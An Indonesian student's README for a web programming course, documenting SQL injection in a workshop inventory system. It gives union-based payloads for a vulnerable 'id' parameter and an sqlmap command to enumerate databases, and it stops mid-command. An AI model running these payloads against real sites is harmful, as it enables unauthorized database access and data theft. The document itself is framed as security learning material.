# Exploitation of SQL Injection: Workshop Inventory Management System

**Nama:** Haris Adriansyah  
**NIM:** 312410286  
**Kelas:** TI.24.A.1 (I.12.1D)  
**Matkul:** Pemrograman Web  
**Dosen:** Agung Nugroho, S.Kom., M.Kom.

![Security](https://img.shields.io/badge/Security-Penetration%20Testing-red)
![License](https://img.shields.io/badge/License-MIT-blue)

Repository ini berisi dokumentasi teknis mengenai temuan kerentanan **SQL Injection (SQLi)** pada Sistem Manajemen Inventaris Bengkel Jaya. Dokumentasi ini bertujuan sebagai referensi pembelajaran bagi developer dan praktisi keamanan siber.

---

## 📝 Deskripsi Proyek
Sistem Manajemen Inventaris ini ditemukan memiliki celah keamanan kritis pada parameter input yang tidak difilter. Hal ini memungkinkan penyerang untuk mengeksekusi perintah SQL berbahaya, mencuri data pengguna, hingga mengambil alih hak akses administrator.

## 🔍 Temuan Kerentanan
- **Vulnerability Type**: SQL Injection (Union Based & Error Based)
- **Affected Component**: Parameter `id` pada `detail_barang.php` dan form login.
- **Impact**: Full Database Disclosure (Data Leakage).

---

## 🚀 Proof of Concept (PoC)

### 1. Manual Injection (Union Based)
Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk memicu error, kemudian menggunakan `ORDER BY` untuk menentukan jumlah kolom yang ada pada tabel database.

* **Payload untuk cek kolom:** `' ORDER BY 5-- -`
* **Payload untuk ekstraksi data:** `' UNION SELECT 1,2,database(),user(),5-- -`

![Manual Injection](img/hasil-manual.png)

### 2. Automated with SQLMap
Setelah celah terverifikasi secara manual, dilakukan eksploitasi otomatis menggunakan **SQLMap** untuk efisiensi ekstraksi data secara menyeluruh.

**A. Enumerasi Database:**
Mencari daftar database yang tersedia di server.
```bash
sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" --batch --dbs
